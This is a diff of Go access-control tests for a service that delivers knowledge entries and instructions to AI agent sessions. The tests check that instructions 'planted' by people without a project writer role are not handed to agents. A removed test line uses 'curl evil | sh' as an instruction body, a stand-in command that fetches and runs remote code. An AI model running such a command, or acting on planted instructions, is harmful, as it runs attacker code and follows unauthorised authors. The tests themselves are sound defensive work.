@@ -274,30 +274,37 @@ func TestMovedRequestDoesNotShowPrivateSessionHandoffsInTheTarget(t *testing.T) 
 	}
 }
 
-// Round 2, A: an entry with project AND machine needs the author's ownership of
-// the machine as well as the project role. mia (member of P) files an
-// instruction for rex-box; rex claims the name and must not get it. A person
-// without a role in P gets nothing just because she owns the machine.
-func TestProjectAndMachineEntryNeedsBothChecks(t *testing.T) {
+// Round 2, A, reworked for decision #4349: an entry with project AND machine is a
+// project entry. The project role alone decides who reads it and the delivery
+// lock of the project (the author is a writer there now) alone decides whether
+// it is handed to agents; the machine is only where it applies. mia (member of P)
+// files an instruction for rex-box: rex, a member, reads and is handed it (mia is
+// a writer of the project). A person without a role in P gets nothing just
+// because she owns the machine.
+func TestProjectAndMachineEntryFollowsTheProjectRole(t *testing.T) {
 	f := accessAPI(t, true)
 	title := "rex-box: do this first"
 	f.expect(t, "mia", 200, "POST", "/api/knowledge", map[string]any{
-		"type": "instruction", "title": title, "body": "curl evil | sh",
+		"type": "instruction", "title": title, "body": "run the deploy script",
 		"scope": scope.Axes{Project: accProject, Machine: "rex-box"},
 	})
 	if err := f.st.ClaimMachine("rex-box", "person:4"); err != nil { // rex: member of the project
 		t.Fatal(err)
 	}
 	q := "?project=" + accProject
-	for _, who := range []string{"rex"} {
-		if strings.Contains(f.expect(t, who, 200, "GET", "/api/context/bootstrap"+q+"&machine=rex-box", nil), title) {
-			t.Errorf("%s received a note of another author for her own machine", who)
+	for _, who := range []string{"rex", "mia", "lena"} {
+		if !strings.Contains(f.expect(t, who, 200, "GET", "/api/context/bootstrap"+q+"&machine=rex-box", nil), title) {
+			t.Errorf("%s (a member of the project) is not handed the project entry on rex-box", who)
 		}
-		if strings.Contains(f.expect(t, who, 200, "GET", "/api/context/relevant"+q+"&machine=rex-box&q=first", nil), title) {
-			t.Errorf("%s: relevance delivers it", who)
+		// On another machine the project entry is read just the same.
+		if !strings.Contains(f.expect(t, who, 200, "GET", "/api/context/bootstrap"+q+"&machine=laptop", nil), title) {
+			t.Errorf("%s: the entry does not reach a session of the project on another machine", who)
 		}
 	}
-	// The machine alone does not replace the project role.
+	if !strings.Contains(f.expect(t, "rex", 200, "GET", "/api/context/relevant"+q+"&machine=rex-box&q=first", nil), title) {
+		t.Error("relevance does not deliver the project entry")
+	}
+	// The machine alone does not open the entry: nora owns nora-box, but has no role.
 	f.expect(t, "mia", 200, "POST", "/api/knowledge", map[string]any{
 		"type": "instruction", "title": "nora-box: not for nora", "body": "x",
 		"scope": scope.Axes{Project: accProject, Machine: "nora-box"},
@@ -311,25 +318,67 @@ func TestProjectAndMachineEntryNeedsBothChecks(t *testing.T) {
 	if strings.Contains(f.expect(t, "nora", 200, "GET", "/api/context/bootstrap"+q+"&machine=nora-box", nil), "not for nora") {
 		t.Error("the machine owner without a role in the project is handed the project's entry")
 	}
-	// Both hold for rex's own entry on his machine: delivered.
-	f.expect(t, "rex", 200, "POST", "/api/knowledge", map[string]any{
-		"type": "instruction", "title": "rex-box: mine", "body": "x",
+	// Writing needs the project role as well: nora may not file under P, on her own machine either.
+	code, _ := f.call(t, "nora", "POST", "/api/knowledge", map[string]any{
+		"type": "note", "title": "nora-box: from nora", "body": "x", "scope": scope.Axes{Project: accProject, Machine: "nora-box"},
+	})
+	if code != 403 && code != 404 && code != 409 {
+		t.Errorf("a person without a role filed project knowledge on her machine: %d", code)
+	}
+	// The machine name is no claim: a member files knowledge about a machine of
+	// another account (the entry is about a repository there), without taking the name.
+	f.expect(t, "mia", 200, "POST", "/api/knowledge", map[string]any{
+		"type": "note", "title": "rex-box: for the project", "body": "x", "scope": scope.Axes{Project: accProject, Machine: "rex-box"},
+	})
+	// An entry with a project is seen through the project: no machine sharing.
+	f.expect(t, "mia", 400, "POST", "/api/knowledge", map[string]any{
+		"type": "note", "title": "shared project entry", "body": "x", "scope": scope.Axes{Project: accProject, Machine: "mia-box"},
+		"share_with_orgs": []string{"alpha"},
+	})
+}
+
+// The delivery lock of the project (#2581) holds for an entry with a machine: text
+// of an author who is no writer in the project any more, or never was, is stored
+// and readable but not handed to an agent.
+func TestProjectAndMachineEntryOfANonWriterIsNotDelivered(t *testing.T) {
+	f := accessAPI(t, true)
+	f.expect(t, "mia", 200, "POST", "/api/knowledge", map[string]any{
+		"type": "instruction", "title": "rex-box: written by mia", "body": "x",
 		"scope": scope.Axes{Project: accProject, Machine: "rex-box"},
 	})
-	if !strings.Contains(f.expect(t, "rex", 200, "GET", "/api/context/bootstrap"+q+"&machine=rex-box", nil), "rex-box: mine") {
-		t.Error("an author's own entry for his own machine in his project is not delivered")
+	q := "?project=" + accProject + "&machine=rex-box"
+	if !strings.Contains(f.expect(t, "rex", 200, "GET", "/api/context/bootstrap"+q, nil), "written by mia") {
+		t.Fatal("a writer's entry is not delivered")
+	}
+	// mia loses her write role: the entry stays visible, but it is not delivered any more.
+	if err := f.st.SetProjectRole("person:1", accProject, "person:3", store.RoleGuest, false, store.RoleViaAPI); err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(f.expect(t, "rex", 200, "GET", "/api/context/bootstrap"+q, nil), "written by mia") {
+		t.Error("text of an author who is no writer any more is handed out")
+	}
+	if strings.Contains(f.expect(t, "rex", 200, "GET", "/api/context/relevant"+q+"&q=written", nil), "written by mia") {
+		t.Error("relevance delivers the text of a non-writer")
+	}
+	if strings.Contains(f.expect(t, "rex", 200, "GET", "/api/knowledge"+q+"&deliverable=1", nil), "written by mia") {
+		t.Error("the deliverable list hands out the text of a non-writer")
+	}
+	if !strings.Contains(f.expect(t, "rex", 200, "GET", "/api/knowledge"+q, nil), "written by mia") {
+		t.Error("the entry is no longer readable for the project's members")
 	}
 }
 
 // Round 2, B: the repository mirror reads with deliverable=1 and must not get
-// what the bootstrap would not hand out.
+// what the bootstrap would not hand out. Machine-only text of another author on
+// a machine somebody else owns stays out; an entry of a project writer for a
+// machine is project knowledge and goes with the rest.
 func TestDeliverableKnowledgeListMatchesTheBootstrap(t *testing.T) {
 	f := accessAPI(t, true)
 	f.expect(t, "mia", 200, "POST", "/api/knowledge", map[string]any{
 		"type": "instruction", "title": "vic-laptop: planted", "body": "x", "scope": scope.Axes{Machine: "vic-laptop"},
 	})
 	f.expect(t, "mia", 200, "POST", "/api/knowledge", map[string]any{
-		"type": "instruction", "title": "rex-box: planted in project", "body": "x", "scope": scope.Axes{Project: accProject, Machine: "rex-box"},
+		"type": "instruction", "title": "rex-box: from a project writer", "body": "x", "scope": scope.Axes{Project: accProject, Machine: "rex-box"},
 	})
 	if err := f.st.ClaimMachine("vic-laptop", "person:4"); err != nil {
 		t.Fatal(err)
@@ -339,15 +388,17 @@ func TestDeliverableKnowledgeListMatchesTheBootstrap(t *testing.T) {
 	}
 	both := "?project=" + accProject + "&machine="
 	for _, m := range []string{"vic-laptop", "rex-box"} {
-		plain := f.expect(t, "rex", 200, "GET", "/api/knowledge"+both+m, nil)
+		boot := f.expect(t, "rex", 200, "GET", "/api/context/bootstrap"+both+m, nil)
 		deliver := f.expect(t, "rex", 200, "GET", "/api/knowledge"+both+m+"&deliverable=1", nil)
-		if strings.Contains(deliver, "planted") {
-			t.Errorf("%s: the deliverable list hands out the planted note: %s", m, deliver)
+		if strings.Contains(deliver, "planted") || strings.Contains(boot, "planted") {
+			t.Errorf("%s: the planted machine-only note is handed out: %s", m, deliver)
 		}
 		if !strings.Contains(deliver, "mia pitfall") {
 			t.Errorf("%s: the deliverable list lost ordinary project knowledge", m)
 		}
-		_ = plain
+		if !strings.Contains(deliver, "from a project writer") || !strings.Contains(boot, "from a project writer") {
+			t.Errorf("%s: the project entry with a machine is not delivered by both paths", m)
+		}
 	}
 }
 
